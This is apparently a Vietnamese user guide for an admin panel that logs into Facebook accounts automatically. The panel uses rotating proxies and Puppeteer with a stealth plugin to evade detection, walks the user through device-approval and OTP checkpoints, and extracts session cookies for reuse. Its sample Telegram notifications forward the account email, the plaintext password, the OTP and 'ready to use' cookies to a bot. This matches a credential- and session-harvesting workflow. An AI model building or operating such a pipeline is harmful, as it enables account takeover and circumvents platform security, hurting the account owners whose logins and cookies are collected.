# Hướng Dẫn Sử Dụng Facebook Auto-Login

## Quy Trình Đăng Nhập Tự Động

### 1. Setup Proxy

**Bước 1:** Truy cập Proxy Manager
- Vào Admin Panel → Automation → Quản lý Proxy

**Bước 2:** Nhập danh sách proxy
- Định dạng: `host:port:user:pass`
- Ví dụ: `45.76.214.123:8080:username:password`
- Paste nhiều proxy, mỗi proxy một dòng

**Bước 3:** Click "Kiểm tra tất cả"
- Hệ thống sẽ test kết nối TCP đến mỗi proxy
- Đợi kết quả kiểm tra
- Chỉ proxy hoạt động mới được sử dụng

---

### 2. Đăng Nhập Facebook

**Bước 1:** Vào trang Đăng nhập
- Admin Panel → Automation → Facebook Auto Login

**Bước 2:** Nhập thông tin
- Email hoặc số điện thoại Facebook
- Mật khẩu
- (Tùy chọn) Số điện thoại để nhận OTP

**Bước 3:** Click "Đăng nhập"

**Hệ thống tự động thực hiện:**
- ✅ Chọn proxy ngẫu nhiên từ danh sách working
- ✅ Mở Facebook với Puppeteer + Stealth plugin
- ✅ Điền thông tin đăng nhập
- ✅ Xử lý checkpoint nếu có

---

### 3. Xử Lý Checkpoint

#### A. Device Approval (Notification)

**Khi xuất hiện modal yêu cầu phê duyệt:**

📱 **Các bước thực hiện:**

1. Mở app Facebook trên điện thoại
2. Nhấn vào thông báo "Đăng nhập từ thiết bị mới"
3. Click "Đây là tôi" hoặc "This was me"
4. Xác nhận thiết bị là của bạn
5. Quay lại màn hình - hệ thống tự động tiếp tục

💡 **Mẹo phê duyệt nhanh:**
- Kiểm tra thông báo trong app Facebook ngay lập tức
- Nếu không thấy thông báo, vào Menu → Settings → Security
- Tìm phần "Where You're Logged In" và phê duyệt thiết bị mới
- Đảm bảo điện thoại có kết nối Internet

**Hệ thống polling tự động:**
- Kiểm tra mỗi 5 giây
- Tối đa 60 giây (12 lần)
- Tự động phát hiện khi phê duyệt thành công

#### B. OTP SMS/Email

**Khi xuất hiện modal nhập OTP:**

1. Kiểm tra SMS hoặc Email
2. Nhập mã OTP 6-8 số vào modal
3. Click "Xác nhận" (hoặc nhấn Enter để gửi nhanh)
4. Nếu sai, nhập lại mã mới

---

### 4. Quản Lý Cookie

**Sau khi đăng nhập thành công:**

**Truy cập:** Admin Panel → Automation → Quản lý Cookie

**Danh sách Cookie hiển thị:**
- Email tài khoản
- Thời gian đăng nhập gần nhất
- Proxy đã sử dụng
- Trạng thái

**Các thao tác:**

📋 **Copy:** Copy cookie vào clipboard
- Format: JSON với tất cả cookies
- Sử dụng cho automation khác

🧪 **Test:** Kiểm tra cookie còn hợp lệ
- Sử dụng Puppeteer test trên Facebook live
- Kết quả: Valid / Invalid

📤 **Telegram:** Gửi cookie lên Telegram
- Gửi đến bot đã config
- Bao gồm đầy đủ thông tin

🗑️ **Delete:** Xóa cookie khỏi database

---

## Theo Dõi Quá Trình Login

### Log Thời Gian Thực

```
[10:35:01] ℹ️ 🚀 Bắt đầu quá trình đăng nhập...
[10:35:02] ℹ️ 🔍 Đang chọn proxy ngẫu nhiên...
[10:35:03] ✅ ✅ Đã chọn: 45.76.214.123:8080
[10:35:04] ℹ️ 🌐 Đang kết nối proxy...
[10:35:05] ✅ ✅ Proxy kết nối thành công
[10:35:06] ℹ️ 🚀 Đang mở Facebook...
[10:35:08] ✅ ✅ Đã mở Facebook
[10:35:09] ℹ️ ✏️ Đang nhập thông tin đăng nhập...
[10:35:11] ℹ️ 🔐 Đang xử lý đăng nhập...
[10:35:13] ⚠️ 🔍 Phát hiện checkpoint...
[10:35:14] ⚠️ 📱 Yêu cầu phê duyệt từ điện thoại...
[10:35:45] ℹ️ ⏳ Đang kiểm tra... (polling)
[10:36:05] ✅ ✅ Đã phát hiện phê duyệt thành công!
[10:36:06] ✅ ✅ Đăng nhập thành công!
[10:36:07] ℹ️ 🍪 Đang trích xuất cookie...
[10:36:08] ✅ ✅ Đã lấy 42 cookies
[10:36:09] ℹ️ 💾 Đang lưu cookie vào database...
[10:36:10] ✅ ✅ Đã lưu cookie vào database
[10:36:11] ℹ️ 📤 Đã gửi thông báo lên Telegram
[10:36:13] ✅ 🎉 Hoàn tất! Tất cả dữ liệu đã được lưu
```

---

## Thông Báo Telegram

### 1. Khi Bắt Đầu Đăng Nhập

```
🚀 BẮT ĐẦU ĐĂNG NHẬP FACEBOOK

📧 Email: test@example.com
📞 Phone: +84987654321
📘 Account: test@example.com
🔑 Password: TestPassword123

⏰ Thời gian: 23:10:46 04/11/2025
```

### 2. Khi Yêu Cầu Device Approval

```
⚠️ YÊU CẦU XÁC MINH THIẾT BỊ

📧 Account: test@example.com
📱 Xác minh: Device Approval

💡 MẸO PHÊ DUYỆT NHANH:
1️⃣ Mở app Facebook trên điện thoại
2️⃣ Nhấn vào thông báo "Login từ thiết bị mới"
3️⃣ Click "Đây là tôi" hoặc "This was me"
4️⃣ Xác nhận thiết bị

⏰ Thời gian: 23:11:05 04/11/2025
```

### 3. Khi Yêu Cầu OTP

```
⚠️ YÊU CẦU XÁC MINH OTP

📧 Account: test@example.com
📞 Xác minh: SMS OTP
🎯 OTP: 123456

⏰ Thời gian: 23:11:20 04/11/2025
```

### 4. Khi Đăng Nhập Thành Công

```
✅ ĐĂNG NHẬP THÀNH CÔNG

📧 Account: test@example.com
🔗 Link ID FB: https://facebook.com/100012345678

📱 THÔNG TIN THIẾT BỊ:
🌐 Browser: Chrome (Stealth Mode)
🔒 Proxy: 45.76.214.123:8080

🍪 COOKIE (SẴN SÀNG DÙNG):
📦 Cookies: 42 cookies
💾 Size: 15234 bytes

✅ Kết quả: THÀNH CÔNG
⏰ Thời gian: 23:12:46 04/11/2025
```

---

## Cấu Hình

### Environment Variables

```env
# Browser Configuration
BROWSER_HEADLESS=true  # Set to false để xem trình duyệt

# Telegram Configuration
TELEGRAM_BOT_TOKEN=123456:ABCdefGHIjklMNOpqrsTUVwxyz
TELEGRAM_CHAT_ID=123456789

# Database (PostgreSQL for production)
DATABASE_URL=postgresql://user:pass@host:5432/dbname
```

### Tạo Telegram Bot

1. Mở Telegram, tìm @BotFather
2. Gửi `/newbot`
3. Đặt tên bot
4. Lấy Bot Token
5. Tìm @userinfobot để lấy Chat ID
6. Cập nhật vào `.env`

---

## Khắc Phục Sự Cố

### Proxy không hoạt động
- Kiểm tra format: `host:port:user:pass`
- Test lại bằng "Kiểm tra tất cả"
- Đảm bảo proxy có kết nối Internet

### Checkpoint không tự động phát hiện
- Kiểm tra điện thoại có Internet
- Phê duyệt trong vòng 60 giây
- Nếu hết thời gian, đăng nhập lại

### Cookie không hợp lệ
- Cookie có thể hết hạn sau vài ngày
- Test lại bằng nút "Test"
- Đăng nhập lại để lấy cookie mới

### Telegram không nhận thông báo
- Kiểm tra Bot Token và Chat ID
- Test bằng `/api/telegram/test`
- Đảm bảo bot đã được start (@your_bot_name)

---

## Lưu Ý Bảo Mật

⚠️ **QUAN TRỌNG:**

- Không chia sẻ cookie với người khác
- Thay đổi mật khẩu định kỳ
- Sử dụng proxy uy tín
- Encrypt database trong production
- Không commit `.env` vào git
- Sử dụng HTTPS cho API calls
- Implement rate limiting tránh bị ban

---

## Hỗ Trợ

Nếu gặp vấn đề, kiểm tra:
1. Logs trong LoginLogger
2. Console logs của browser
3. Database logs
4. Network connectivity

Liên hệ support với đầy đủ thông tin lỗi.
